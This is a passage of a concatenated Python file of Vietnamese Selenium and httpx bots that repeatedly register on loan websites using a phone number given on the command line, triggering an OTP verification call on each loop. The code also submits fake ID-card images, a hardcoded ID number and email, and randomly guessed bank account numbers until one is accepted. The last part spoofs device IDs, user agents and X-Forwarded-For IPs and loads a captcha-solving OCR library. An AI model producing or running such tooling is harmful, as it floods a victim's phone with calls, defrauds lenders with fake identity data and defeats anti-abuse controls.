                    continue
        except:
            pass
        return False
    
    def dang_ky_mot_lan(self, lan):
        """Thực hiện đăng ký một lần"""
        print(f"\n{'='*40}")
        print(f"LẦN {lan}/{self.so_lan_lap}")
        print(f"{'='*40}")
        
        driver = self.setup_driver()
        wait = WebDriverWait(driver, 15)
        
        try:
            driver.get("https://vayxanh.com/")
            time.sleep(3)
            
            self.dong_popup(driver)
            
            if not self.nhap_so_dien_thoai(driver, wait):
                raise Exception("Không thể nhập số điện thoại")
            
            if not self.click_dang_ky(driver, wait):
                raise Exception("Không thể click nút Đăng ký")
            
            trang_thai = self.kiem_tra_trang_thai(driver)
            
            if trang_thai == "dang_nhap":
                print("❌ Số điện thoại đã được đăng ký trước đó")
                self.dong_popup(driver)
                raise Exception("Số điện thoại đã đăng ký")
            
            print("\n📞 Đang chuyển sang trang xác thực...")
            time.sleep(3)
            
            if not self.click_nhan_cuoc_goi(driver, wait):
                raise Exception("Không thể click Nhận cuộc gọi")
            
            print(f"✅ Hoàn thành lần đăng ký {lan}")
            self.thanh_cong += 1
            
            time.sleep(5)
            
        except Exception as e:
            print(f"❌ Lỗi: {e}")
            self.that_bai += 1
            
            try:
                driver.save_screenshot(f"vayxanh_error_lan_{lan}.png")
                print(f"📸 Đã lưu ảnh lỗi: vayxanh_error_lan_{lan}.png")
            except:
                pass
        
        finally:
            try:
                driver.quit()
            except:
                pass
    
    def chay(self):
        """Chạy chương trình"""
        print("="*60)
        print(" VAYXANH.COM - ĐĂNG KÝ TỰ ĐỘNG")
        print("="*60)
        print(f"Số điện thoại: {self.so_dien_thoai}")
        print(f"Số lần đăng ký: {self.so_lan_lap}")
        print("="*60)
        print("⚠️ Lưu ý: Chỉ đăng ký với số điện thoại CHƯA đăng ký")
        print("="*60)
        
        for lan in range(1, self.so_lan_lap + 1):
            self.dang_ky_mot_lan(lan)
            
            if lan < self.so_lan_lap:
                print(f"\n⏳ Nghỉ 5 giây...")
                time.sleep(5)
        
        print(f"\n{'='*60}")
        print(f"📊 KẾT QUẢ:")
        print(f"   ✅ Thành công: {self.thanh_cong}")
        print(f"   ❌ Thất bại: {self.that_bai}")
        if self.so_lan_lap > 0:
            print(f"   📊 Tỷ lệ: {self.thanh_cong/self.so_lan_lap*100:.1f}%")
        print(f"{'='*60}")


def main_7():
    # Lấy tham số từ dòng lệnh
    if len(sys.argv) >= 2:
        so_dien_thoai = sys.argv[1]
    else:
        so_dien_thoai = input("Nhập số điện thoại (10 số, bắt đầu bằng 0): ")
    
    if len(sys.argv) >= 3:
        so_lan_lap = int(sys.argv[2])
    else:
        so_lan_lap = int(input("Nhập số lần đăng ký: "))
    
    print(f"\n📱 Số điện thoại: {so_dien_thoai}")
    print(f"🔄 Số lần đăng ký: {so_lan_lap}")
    print("🚀 TỰ ĐỘNG CHẠY...")
    print("="*60)
    
    bot = VayXanhBot(so_dien_thoai, so_lan_lap)
    bot.chay()



# ============================================================
# FILE 8
# ============================================================
import os
import time
import random
import sys
import subprocess

def auto_install_packages():
    packages = ['selenium', 'fake-useragent']
    for package in packages:
        try:
            if package == 'fake-useragent':
                __import__('fake_useragent')
            else:
                __import__(package)
            print(f"✅ {package} đã được cài đặt")
        except ImportError:
            print(f"📦 Đang cài đặt {package}...")
            subprocess.check_call([sys.executable, "-m", "pip", "install", package, "--quiet"])
            print(f"✅ Đã cài đặt {package}")

auto_install_packages()

from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.action_chains import ActionChains
from selenium.webdriver.edge.options import Options
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from fake_useragent import UserAgent

ua = UserAgent()

NGAY_SINH = "30.04.1999"
SO_CCCD = "049234928948"
SO_DT_NGUOI_THAN = "948487344"
SO_DT_TUYEN_DUNG = "912345678"
EMAIL = "huutinh1976743@gmail.com"
HO_TEN = "Nguyễn Văn A"

cac_hang = ["Iphone", "Samsung", "Oppo", "Xiaomi"]

def tao_file_anh_gia(path, kich_thuoc=(800, 600)):
    try:
        with open(path, 'wb') as f:
            f.write(b'\xFF\xD8\xFF\xE0\x00\x10\x4A\x46\x49\x46\x00\x01\x01\x01\x00\x60\x00\x60\x00\x00\xFF\xDB\x00\x43\x00\x03\x02\x02\x02\x02\x02\x03\x02\x02\x02\x03\x03\x03\x03\x04\x06\x04\x04\x04\x04\x04\x08\x06\x06\x05\x06\x09\x08\x0A\x0A\x09\x08\x09\x09\x0A\x0C\x0F\x0C\x0A\x0B\x0E\x0B\x09\x09\x0D\x11\x0D\x0E\x0F\x10\x10\x11\x10\x0A\x0C\x12\x13\x12\x10\x13\x0F\x10\x10\x10\xFF\xC0\x00\x0B\x08\x02\x58\x02\x58\x01\x01\x11\x00\xFF\xC4\x00\x1F\x00\x00\x01\x05\x01\x01\x01\x01\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0A\x0B\xFF\xC4\x00\xB5\x10\x00\x02\x01\x03\x03\x02\x04\x03\x05\x05\x04\x04\x00\x00\x01\x7D\x01\x02\x03\x00\x04\x11\x05\x12\x21\x31\x41\x51\x61\x07\x22\x71\x14\x32\x81\x91\xA1\x08\x23\x42\xB1\xC1\x15\x52\xD1\xF0\x24\x33\x62\x72\x82\x09\x0A\x16\x17\x18\x19\x1A\x25\x26\x27\x28\x29\x2A\x34\x35\x36\x37\x38\x39\x3A\x43\x44\x45\x46\x47\x48\x49\x4A\x53\x54\x55\x56\x57\x58\x59\x5A\x63\x64\x65\x66\x67\x68\x69\x6A\x73\x74\x75\x76\x77\x78\x79\x7A\x83\x84\x85\x86\x87\x88\x89\x8A\x92\x93\x94\x95\x96\x97\x98\x99\x9A\xA2\xA3\xA4\xA5\xA6\xA7\xA8\xA9\xAA\xB2\xB3\xB4\xB5\xB6\xB7\xB8\xB9\xBA\xC2\xC3\xC4\xC5\xC6\xC7\xC8\xC9\xCA\xD2\xD3\xD4\xD5\xD6\xD7\xD8\xD9\xDA\xE1\xE2\xE3\xE4\xE5\xE6\xE7\xE8\xE9\xEA\xF1\xF2\xF3\xF4\xF5\xF6\xF7\xF8\xF9\xFA\xFF\xC4\x00\x1F\x01\x00\x03\x01\x01\x01\x01\x01\x01\x01\x01\x01\x00\x00\x00\x00\x00\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0A\x0B\xFF\xC4\x00\xB5\x11\x00\x02\x01\x02\x04\x04\x03\x04\x07\x05\x04\x04\x00\x01\x02\x77\x00\x01\x02\x03\x11\x04\x05\x21\x31\x06\x12\x41\x51\x61\x07\x71\x13\x22\x32\x81\x08\x14\x42\x91\xA1\xB1\xC1\x09\x23\x33\x52\xF0\x15\x62\x72\xD1\x0A\x16\x24\x34\xE1\x25\xF1\x17\x18\x19\x1A\x26\x27\x28\x29\x2A\x35\x36\x37\x38\x39\x3A\x43\x44\x45\x46\x47\x48\x49\x4A\x53\x54\x55\x56\x57\x58\x59\x5A\x63\x64\x65\x66\x67\x68\x69\x6A\x73\x74\x75\x76\x77\x78\x79\x7A\x82\x83\x84\x85\x86\x87\x88\x89\x8A\x92\x93\x94\x95\x96\x97\x98\x99\x9A\xA2\xA3\xA4\xA5\xA6\xA7\xA8\xA9\xAA\xB2\xB3\xB4\xB5\xB6\xB7\xB8\xB9\xBA\xC2\xC3\xC4\xC5\xC6\xC7\xC8\xC9\xCA\xD2\xD3\xD4\xD5\xD6\xD7\xD8\xD9\xDA\xE2\xE3\xE4\xE5\xE6\xE7\xE8\xE9\xEA\xF2\xF3\xF4\xF5\xF6\xF7\xF8\xF9\xFA\xFF\xDA\x00\x0C\x03\x01\x00\x02\x11\x03\x11\x00\x3F\x00')
            for i in range(100):
                f.write(b'\xFF' * 1000)
        print(f"✅ Đã tạo file ảnh giả: {path}")
        return True
    except Exception as e:
        print(f"❌ Lỗi tạo ảnh giả: {e}")
        return False

PATH_ANH_1 = r"C:\Users\Administrator\Downloads\cccd_truoc.jpg"
PATH_ANH_2 = r"C:\Users\Administrator\Downloads\cccd_sau.jpg"
PATH_ANH_3 = r"C:\Users\Administrator\Downloads\chan_dung.jpg"

if not os.path.exists(PATH_ANH_1):
    print("📁 Tạo ảnh giả cho CCCD...")
    temp_dir = os.environ.get('TEMP', r'C:\Users\Administrator\Downloads')
    PATH_ANH_1 = os.path.join(temp_dir, 'cccd_truoc.jpg')
    PATH_ANH_2 = os.path.join(temp_dir, 'cccd_sau.jpg')
    PATH_ANH_3 = os.path.join(temp_dir, 'chan_dung.jpg')
    tao_file_anh_gia(PATH_ANH_1)
    tao_file_anh_gia(PATH_ANH_2)
    tao_file_anh_gia(PATH_ANH_3)

def random_so_tai_khoan():
    so_chu_so = random.choice([8, 9, 10])
    so_tk = ''.join([str(random.randint(0, 9)) for _ in range(so_chu_so)])
    return so_tk, so_chu_so

def kiem_tra_loi_sau_tiep_tuc(driver):
    time.sleep(1.5)
    try:
        loi_element = driver.find_element(By.XPATH, "//*[contains(text(), 'không được để trống') or contains(text(), 'không hợp lệ')]")
        if loi_element.is_displayed():
            return True
    except:
        pass
    return False

def dong_popup(driver):
    try:
        driver.execute_script("""
            var popups = document.querySelectorAll('.modal, .popup, .overlay, [role="dialog"]');
            for(var i=0; i<popups.length; i++) {
                if(popups[i].style.display !== 'none' && popups[i].style.visibility !== 'hidden') {
                    popups[i].style.display = 'none';
                    var closeBtn = popups[i].querySelector('.close, [aria-label="Close"]');
                    if(closeBtn) closeBtn.click();
                }
            }
        """)
        time.sleep(0.5)
        return True
    except:
        return False

def upload_anh_va_otp(driver, lan):
    print("\n" + "="*60)
    print(f"📸 LẦN {lan} - UPLOAD ẢNH CCCD VÀ NHẬN OTP")
    print("="*60)
    
    driver.execute_script("window.scrollTo(0, 0);")
    time.sleep(2)
    
    file_inputs = driver.find_elements(By.XPATH, "//input[@type='file']")
    print(f"📁 Tìm thấy {len(file_inputs)} input file")
    
    anh_paths = [PATH_ANH_1, PATH_ANH_2, PATH_ANH_3]
    for i in range(min(3, len(file_inputs))):
        try:
            if os.path.exists(anh_paths[i]):
                file_inputs[i].send_keys(anh_paths[i])
                print(f"✅ Đã upload ảnh {i+1}: {os.path.basename(anh_paths[i])}")
            else:
                tao_file_anh_gia(anh_paths[i])
                file_inputs[i].send_keys(anh_paths[i])
                print(f"✅ Đã tạo và upload ảnh {i+1}")
            time.sleep(1)
        except Exception as e:
            print(f"❌ Lỗi upload ảnh {i+1}: {e}")
    
    print("\n📱 XÁC THỰC OTP...")
    time.sleep(3)
    
    driver.execute_script("window.scrollTo(0, document.body.scrollHeight);")
    time.sleep(2)
    
    clicked = False
    
    cac_tu_tim = ["cuộc gọi", "gọi điện", "call", "voice call"]
    
    for tu in cac_tu_tim:
        if clicked:
            break
        try:
            otp_btn = driver.find_element(By.XPATH, f"//button[contains(translate(text(), 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), '{tu}')]")
            driver.execute_script("arguments[0].scrollIntoView({block: 'center'});", otp_btn)
            time.sleep(0.5)
            driver.execute_script("arguments[0].click();", otp_btn)
            print(f"📞 Đã ấn nút chứa '{tu}'")
            clicked = True
            break
        except:
            continue
    
    if not clicked:
        try:
            buttons = driver.find_elements(By.TAG_NAME, "button")
            for btn in buttons:
                text_btn = btn.text.lower()
                if ("gọi" in text_btn or "cuộc" in text_btn or "call" in text_btn) and "zalo" not in text_btn:
                    driver.execute_script("arguments[0].scrollIntoView({block: 'center'});", btn)
                    time.sleep(0.5)
                    driver.execute_script("arguments[0].click();", btn)
                    print(f"📞 Đã ấn nút cuộc gọi: '{btn.text}'")
                    clicked = True
                    break
        except:
            pass
    
    if not clicked:
        try:
            driver.execute_script("""
                var btns = document.querySelectorAll('button');
                for(var i=0; i<btns.length; i++) {
                    var txt = btns[i].innerText.toLowerCase();
                    if((txt.includes('gọi') || txt.includes('cuộc') || txt.includes('call')) && !txt.includes('zalo')) {
                        btns[i].scrollIntoView({block: 'center'});
                        btns[i].click();
                        return true;
                    }
                }
            """)
            print("📞 Đã click nút cuộc gọi bằng JavaScript")
            clicked = True
        except:
            pass
    
    if not clicked:
        print("❌ KHÔNG TÌM THẤY NÚT CUỘC GỌI!")
    
    print("\n⏳ Chờ 10 giây để OTP được gửi qua cuộc gọi...")
    time.sleep(10)

def click_dang_ky_ngay(driver):
    print("🔍 Đang tìm nút Đăng ký Ngay...")
    
    try:
        WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.TAG_NAME, "button"))
        )
    except:
        pass
    
    for _ in range(3):
        try:
            driver.execute_script("""
                var popups = document.querySelectorAll('[class*="popup"], [class*="modal"], [class*="overlay"]');
                for(var i=0; i<popups.length; i++) {
                    if(popups[i].style.display !== 'none') {
                        popups[i].style.display = 'none';
                    }
                }
            """)
        except:
            pass
        time.sleep(0.3)
    
    cac_cach_tim = [
        (By.XPATH, "//button[contains(text(), 'Đăng ký')]"),
        (By.XPATH, "//button[contains(text(), 'Đăng Ký')]"),
        (By.XPATH, "//button[contains(text(), 'dang ky')]"),
        (By.XPATH, "//button[contains(@class, 'register')]"),
        (By.XPATH, "//button[contains(@class, 'submit')]"),
        (By.XPATH, "//button[@type='submit']"),
        (By.XPATH, "//div[contains(@class, 'btn')]//button"),
        (By.XPATH, "//*[contains(text(), 'Đăng ký Ngay')]"),
        (By.XPATH, "//*[text()='Đăng ký Ngay']"),
    ]
    
    for by, selector in cac_cach_tim:
        try:
            buttons = driver.find_elements(by, selector)
            for btn in buttons:
                if btn.is_displayed():
                    driver.execute_script("arguments[0].scrollIntoView({block: 'center', behavior: 'smooth'});", btn)
                    time.sleep(0.5)
                    driver.execute_script("arguments[0].click();", btn)
                    print(f"✅ Đã nhấn nút Đăng ký: {btn.text if btn.text else selector}")
                    return True
        except:
            continue
    
    try:
        result = driver.execute_script("""
            var btns = document.querySelectorAll('button');
            for(var i=0; i<btns.length; i++) {
                var txt = btns[i].innerText.toLowerCase();
                if(txt.includes('đăng ký') || txt.includes('dang ky')) {
                    btns[i].scrollIntoView({block: 'center'});
                    btns[i].click();
                    return true;
                }
            }
            var divs = document.querySelectorAll('div[role="button"], div.clickable, a');
            for(var i=0; i<divs.length; i++) {
                var txt = divs[i].innerText.toLowerCase();
                if(txt.includes('đăng ký') || txt.includes('dang ky')) {
                    divs[i].scrollIntoView({block: 'center'});
                    divs[i].click();
                    return true;
                }
            }
            return false;
        """)
        if result:
            print("✅ Đã nhấn nút Đăng ký bằng JavaScript")
            return True
    except:
        pass
    
    print("\n🔍 DEBUG: Tất cả button trên trang:")
    buttons = driver.find_elements(By.TAG_NAME, "button")
    for i, btn in enumerate(buttons):
        print(f"   Button {i}: text='{btn.text}', display={btn.is_displayed()}")
    
    print("❌ KHÔNG TÌM THẤY NÚT ĐĂNG KÝ!")
    return False

def thuc_hien_mot_lan(driver, lan, so_dien_thoai):
    print("\n" + "="*60)
    print(f"🔄 LẦN {lan} - BẮT ĐẦU ĐĂNG KÝ")
    print(f"📞 Số điện thoại: {so_dien_thoai}")
    print("="*60)
    
    random_ua = ua.random
    
    dong_popup(driver)
    
    print("\n🏠 TRANG CHỦ")
    driver.get("https://web.fincalc.vn/")
    time.sleep(5)
    
    dong_popup(driver)
    
    for _ in range(5):
        webdriver.ActionChains(driver).send_keys(Keys.ESCAPE).perform()
        time.sleep(0.3)
    
    dong_popup(driver)
    time.sleep(1)
    
    try:
        WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.TAG_NAME, "input"))
        )
    except:
        pass
    
    inputs = driver.find_elements(By.TAG_NAME, "input")
    print(f"📝 Tìm thấy {len(inputs)} input")
    
    if len(inputs) >= 3:
        for i in range(3):
            try:
                if inputs[i].is_displayed() and inputs[i].is_enabled():
                    driver.execute_script("arguments[0].value = '';", inputs[i])
                    time.sleep(0.2)
                else:
                    print(f"⚠️ Input {i+1} không hiển thị hoặc bị disable")
            except:
                print(f"⚠️ Không thể clear input {i+1}")
        
        try:
            inputs[0].send_keys(HO_TEN)
            print(f"✅ Họ tên: {HO_TEN}")
        except:
            driver.execute_script("arguments[0].value = arguments[1];", inputs[0], HO_TEN)
            print(f"✅ Họ tên (JS): {HO_TEN}")
        
        try:
            inputs[1].send_keys(so_dien_thoai)
            print(f"✅ Số điện thoại: {so_dien_thoai}")
        except:
            driver.execute_script("arguments[0].value = arguments[1];", inputs[1], so_dien_thoai)
            print(f"✅ Số điện thoại (JS): {so_dien_thoai}")
        
        try:
            inputs[2].send_keys(EMAIL)
            print(f"✅ Email: {EMAIL}")
        except:
            driver.execute_script("arguments[0].value = arguments[1];", inputs[2], EMAIL)
            print(f"✅ Email (JS): {EMAIL}")
        
        driver.execute_script("document.activeElement?.blur(); document.body.click();")
        time.sleep(1)
    else:
        print(f"❌ Không đủ input (cần 3, có {len(inputs)})")
        return False
    
    print("\n🖱️ ĐANG CLICK NÚT ĐĂNG KÝ NGAY...")
    click_dang_ky_ngay(driver)
    
    print("\n⏳ ĐỢI TRANG CHUYỂN HƯỚNG (TỐI ĐA 20 GIÂY)...")
    
    da_chuyen = False
    for i in range(20):
        time.sleep(1)
        current_url = driver.current_url
        if "reg/personal" in current_url:
            print(f"✅ Đã chuyển sang trang: {current_url}")
            da_chuyen = True
            break
        if "reg" in current_url:
            print(f"✅ Đã chuyển sang: {current_url}")
            da_chuyen = True
            break
        if i == 5:
            print("   ⚠️ Vẫn đang đợi, thử click lại...")
            click_dang_ky_ngay(driver)
        if i == 10:
            print("   ⚠️ Đợi lâu hơn, kiểm tra lại...")
    
    if not da_chuyen:
        print(f"⚠️ Không chuyển được trang, URL hiện tại: {driver.current_url}")
        print("⚠️ Thử lại lần cuối...")
        click_dang_ky_ngay(driver)
        time.sleep(5)
        if "reg" in driver.current_url:
            print(f"✅ Đã chuyển sau khi thử lại: {driver.current_url}")
        else:
            print("❌ VẪN KHÔNG CHUYỂN ĐƯỢC TRANG!")
            return False
    
    time.sleep(2)
    
    print("\n📝 TRANG ĐĂNG KÝ CÁ NHÂN")
    time.sleep(3)
    
    for _ in range(5):
        driver.find_element(By.TAG_NAME, "body").send_keys(Keys.ESCAPE)
        time.sleep(0.2)
    
    dong_popup(driver)
    time.sleep(1)
    
    try:
        WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.TAG_NAME, "input"))
        )
    except:
        pass
    
    inputs = driver.find_elements(By.TAG_NAME, "input")
    print(f"📝 Tìm thấy {len(inputs)} input ở trang cá nhân")
    
    if len(inputs) >= 2:
        try:
            if inputs[0].is_displayed() and inputs[0].is_enabled():
                driver.execute_script("arguments[0].value = '';", inputs[0])
                inputs[0].send_keys(NGAY_SINH)
                print(f"✅ Ngày sinh: {NGAY_SINH}")
            else:
                driver.execute_script("arguments[0].value = arguments[1];", inputs[0], NGAY_SINH)
                print(f"✅ Ngày sinh (JS): {NGAY_SINH}")
        except:
            driver.execute_script("arguments[0].value = arguments[1];", inputs[0], NGAY_SINH)
            print(f"✅ Ngày sinh (JS): {NGAY_SINH}")
        
        try:
            if inputs[1].is_displayed() and inputs[1].is_enabled():
                driver.execute_script("arguments[0].value = '';", inputs[1])
                inputs[1].send_keys(SO_CCCD)
                print(f"✅ CCCD: {SO_CCCD}")
            else:
                driver.execute_script("arguments[0].value = arguments[1];", inputs[1], SO_CCCD)
                print(f"✅ CCCD (JS): {SO_CCCD}")
        except:
            driver.execute_script("arguments[0].value = arguments[1];", inputs[1], SO_CCCD)
            print(f"✅ CCCD (JS): {SO_CCCD}")
        time.sleep(1)
    
    try:
        driver.find_element(By.XPATH, "//*[text()='Nam']").click()
        print("✅ Giới tính: Nam")
    except:
        try:
            driver.find_element(By.XPATH, "//*[contains(text(), 'Nam')]").click()
            print("✅ Giới tính: Nam")
        except:
            print("⚠️ Không chọn được giới tính")
    
    comboboxes = driver.find_elements(By.XPATH, "//button[@role='combobox']")
    if len(comboboxes) > 0:
        tinh_thanh = comboboxes[0]
        driver.execute_script("arguments[0].scrollIntoView({block: 'center'});", tinh_thanh)
        time.sleep(0.5)
        tinh_thanh.click()
        print("📍 Đã mở dropdown Tỉnh/Thành")
        time.sleep(1)
        try:
            driver.find_element(By.XPATH, "//*[text()='Bac Giang']").click()
            print("✅ Đã chọn: Bắc Giang")
        except:
            driver.find_element(By.XPATH, "//*[contains(text(), 'Bac Giang')]").click()
            print("✅ Đã chọn: Bắc Giang")
        time.sleep(0.5)
    
    print("\n📱 Chọn hãng điện thoại...")
    if len(comboboxes) > 1:
        hieu_dt = comboboxes[1]
        driver.execute_script("arguments[0].scrollIntoView({block: 'center'});", hieu_dt)
        time.sleep(0.5)
        
        for hang in cac_hang:
            try:
                print(f"   🔄 Đang thử: {hang}")
                driver.execute_script("arguments[0].click();", hieu_dt)
                time.sleep(1)
                driver.find_element(By.XPATH, f"//*[text()='{hang}']").click()
                print(f"   ✅ Đã chọn: {hang}")
                time.sleep(1)
                break
            except:
                try:
                    driver.execute_script("arguments[0].click();", hieu_dt)
                    time.sleep(1)
                    driver.find_element(By.XPATH, f"//*[contains(text(), '{hang}')]").click()
                    print(f"   ✅ Đã chọn: {hang}")
                    time.sleep(1)
                    break
                except:
                    print(f"   ❌ Không chọn được {hang}")
                    continue
    
    print("\n📞 Nhập số điện thoại...")
    time.sleep(1)
    
    tat_ca_input_tel = driver.find_elements(By.XPATH, "//input[@type='tel']")
    print(f"📝 Tìm thấy {len(tat_ca_input_tel)} input type=tel")
    
    if len(tat_ca_input_tel) > 2:
        so_nguoi_than = tat_ca_input_tel[2]
        driver.execute_script("arguments[0].scrollIntoView({block: 'center'});", so_nguoi_than)
        time.sleep(0.5)
        so_nguoi_than.click()
        time.sleep(0.3)
        driver.execute_script("arguments[0].value = '';", so_nguoi_than)
        so_nguoi_than.send_keys(SO_DT_NGUOI_THAN)
        print(f"✅ Số người thân: {SO_DT_NGUOI_THAN}")
    
    if len(tat_ca_input_tel) > 3:
        so_tuyen_dung = tat_ca_input_tel[3]
        driver.execute_script("arguments[0].scrollIntoView({block: 'center'});", so_tuyen_dung)
        time.sleep(0.5)
        so_tuyen_dung.click()
        time.sleep(0.3)
        driver.execute_script("arguments[0].value = '';", so_tuyen_dung)
        so_tuyen_dung.send_keys(SO_DT_TUYEN_DUNG)
        print(f"✅ Số tuyển dụng: {SO_DT_TUYEN_DUNG}")
    
    print("\n🏦 Chọn Tên Ngân Hàng...")
    driver.execute_script("window.scrollTo(0, document.body.scrollHeight - 400);")
    time.sleep(2)
    
    tat_ca_combobox = driver.find_elements(By.XPATH, "//button[@role='combobox']")
    print(f"   📍 Tìm thấy {len(tat_ca_combobox)} combobox")
    
    if len(tat_ca_combobox) > 2:
        ngan_hang_combobox = tat_ca_combobox[2]
        driver.execute_script("arguments[0].scrollIntoView({block: 'center'});", ngan_hang_combobox)
        time.sleep(0.5)
        ngan_hang_combobox.click()
        print("   ✅ Đã mở dropdown ngân hàng")
        time.sleep(1.5)
        
        try:
            options = driver.find_elements(By.CSS_SELECTOR, "li[role='option']")
            if not options:
                options = driver.find_elements(By.CSS_SELECTOR, "ul li")
            if not options:
                options = driver.find_elements(By.CSS_SELECTOR, "[role='option']")
            
            if options:
                driver.execute_script("arguments[0].click();", options[0])
                print(f"   ✅ Đã chọn: {options[0].text[:50]}...")
            else:
                driver.find_element(By.XPATH, "//*[contains(text(), 'Vietcombank')]").click()
                print("   ✅ Đã chọn Vietcombank")
            time.sleep(1)
        except Exception as e:
            print(f"   ❌ Lỗi chọn ngân hàng: {e}")
    
    print("\n💰 NHẬP SỐ TÀI KHOẢN (RANDOM 8/9/10 SỐ)")
    
    tat_ca_input_text = driver.find_elements(By.TAG_NAME, "input")
    so_tk_input = None
    
    for inp in reversed(tat_ca_input_text):
        if inp.is_displayed() and inp.is_enabled():
            so_tk_input = inp
            break
    
    if not so_tk_input:
        print("❌ Không tìm thấy ô nhập số tài khoản!")
        return False
    
    thanh_cong = False
    so_lan_thu = 0
    max_lan = 30
    
    while not thanh_cong and so_lan_thu < max_lan:
        so_lan_thu += 1
        so_tk, so_chu_so = random_so_tai_khoan()
        print(f"\n🔄 Thử số {so_lan_thu}/{max_lan}: {so_tk} ({so_chu_so} số)")
        
        driver.execute_script("arguments[0].scrollIntoView({block: 'center'});", so_tk_input)
        time.sleep(0.3)
        driver.execute_script("arguments[0].value = '';", so_tk_input)
        so_tk_input.send_keys(so_tk)
        time.sleep(0.5)
        
        driver.execute_script("document.activeElement?.blur(); document.body.click();")
        time.sleep(1)
        
        try:
            tiep_tuc = driver.find_element(By.XPATH, "//button[normalize-space()='Tiếp tục']")
            if tiep_tuc.is_displayed() and tiep_tuc.is_enabled():
                driver.execute_script("arguments[0].scrollIntoView({block: 'center'});", tiep_tuc)
                time.sleep(0.5)
                driver.execute_script("arguments[0].click();", tiep_tuc)
                print(f"   ⏩ Đã ấn Tiếp tục")
                time.sleep(2)
            else:
                print(f"   ❌ Nút Tiếp tục không thể click!")
                continue
        except:
            print(f"   ❌ Không tìm thấy nút Tiếp tục!")
            continue
        
        co_loi = kiem_tra_loi_sau_tiep_tuc(driver)
        
        if co_loi:
            print(f"   ❌ Số {so_tk} không hợp lệ. Thử số khác...")
        else:
            try:
                tiep_tuc_check = driver.find_element(By.XPATH, "//button[normalize-space()='Tiếp tục']")
                print(f"   ⚠️ Vẫn còn nút Tiếp tục, thử lại...")
                continue
            except:
                thanh_cong = True
                print(f"\n🎉 THÀNH CÔNG! Số {so_tk} ({so_chu_so} số) được chấp nhận!")
                break
    
    if thanh_cong:
        print(f"\n📌 SỐ TÀI KHOẢN LẦN {lan}: {so_tk}")
        
        print("\n⏩ NHẤN TIẾP TỤC LẦN CUỐI ĐỂ TIẾP TỤC...")
        time.sleep(2)
        try:
            tiep_tuc_lan_cuoi = driver.find_element(By.XPATH, "//button[normalize-space()='Tiếp tục']")
            driver.execute_script("arguments[0].scrollIntoView({block: 'center'});", tiep_tuc_lan_cuoi)
            time.sleep(0.5)
            driver.execute_script("arguments[0].click();", tiep_tuc_lan_cuoi)
            print("✅ Đã nhấn Tiếp tục lần cuối, chuyển sang upload ảnh...")
            time.sleep(3)
        except Exception as e:
            print(f"⚠️ Không tìm thấy nút Tiếp tục: {e}")
        
        upload_anh_va_otp(driver, lan)
        return True
    else:
        print(f"\n❌ LẦN {lan} THẤT BẠI!")
        return False

def main_8():
    print("="*60)
    print("MONEYCAT - ĐĂNG KÝ TÀI KHOẢN")
    print("="*60)
    
    if len(sys.argv) >= 2:
        SO_DIEN_THOAI = str(sys.argv[1]).lstrip('0')
        print(f"📞 Số điện thoại từ lệnh: {SO_DIEN_THOAI}")
    else:
        SO_DIEN_THOAI = input("📞 Nhập số điện thoại: ").strip()
        SO_DIEN_THOAI = SO_DIEN_THOAI.lstrip('0')
    
    if len(sys.argv) >= 3:
        SO_LAN_LAP = int(sys.argv[2])
        print(f"🔄 Số lần lặp từ lệnh: {SO_LAN_LAP}")
    else:
        SO_LAN_LAP = int(input("🔄 Nhập số lần lặp: "))
    
    print(f"\n✅ Số điện thoại: {SO_DIEN_THOAI} | Số lần lặp: {SO_LAN_LAP}")
    
    options = Options()
    options.add_argument("--start-maximized")
    options.add_argument("--disable-notifications")
    
    thanh_cong = 0
    that_bai = 0
    
    for lan in range(1, SO_LAN_LAP + 1):
        print(f"\n{'🌟'*30}")
        print(f"🌟 LẦN {lan}/{SO_LAN_LAP}")
        print(f"{'🌟'*30}")
        
        driver = webdriver.Edge(options=options)
        ket_qua = thuc_hien_mot_lan(driver, lan, SO_DIEN_THOAI)
        driver.quit()
        
        if ket_qua:
            thanh_cong += 1
        else:
            that_bai += 1
        
        if lan < SO_LAN_LAP:
            print(f"\n⏳ Đợi 5 giây trước lần {lan+1}...")
            time.sleep(5)
    
    print("\n" + "="*60)
    print("TỔNG KẾT")
    print("="*60)
    print(f"   ✅ Thành công: {thanh_cong}/{SO_LAN_LAP} lần")
    print(f"   ❌ Thất bại: {that_bai}/{SO_LAN_LAP} lần")
    print("="*60)


# ============================================================
# FILE 9
# ============================================================
import sys
import os
import secrets
import random
import httpx
import asyncio
import time
import gc
import uuid
import hashlib
from datetime import datetime, timedelta
import json
import base64
import io
from typing import Optional, Dict, Tuple
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from PIL import ImageFile, Image
import ddddocr
ImageFile.LOAD_TRUNCATED_IMAGES = True
_ocr = ddddocr.DdddOcr(show_ad=False)

def build_headers(origin, mode="ios"):
    devices = [
        "SM-G998B", "SM-F926B", "SM-S901B", "SM-A536E", "SM-M526B",
        "Xiaomi 13 Pro", "Xiaomi 14 Ultra", "Redmi Note 13 Pro",
        "Redmi K70", "POCO X6 Pro",
        "Nubia Neo 5G", "Nubia Z60 Ultra", "Nubia Red Magic 9 Pro",
        "OPPO Find X7 Ultra", "OPPO Reno 11 Pro", "OPPO A78",
        "vivo X100 Pro", "iQOO 12 Pro", "iQOO Neo 9 Pro",
        "iPhone15,2", "iPhone15,3", "iPhone16,1", "iPhone16,2",
        "Pixel 8 Pro", "Pixel 7a", "M2012K11AG", "V2134", "CPH2211"
    ]
    android_versions = ["11", "12", "13", "14", "15"]
    device = random.choice(devices)
    return {
        "accept": "application/json, text/plain, */*",
        "accept-language": "vi-VN,vi;q=0.9,en-US;q=0.8",
        "content-type": "application/json",
        "x-client-type": "phone",
        "origin": origin,
        "referer": origin + "/",
        "User-Agent": f"Dalvik/2.1.0 (Linux; U; Android {random.choice(android_versions)}; {device})",
        "X-Device-ID": hashlib.md5(str(random.random()).encode()).hexdigest()[:16],
        "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
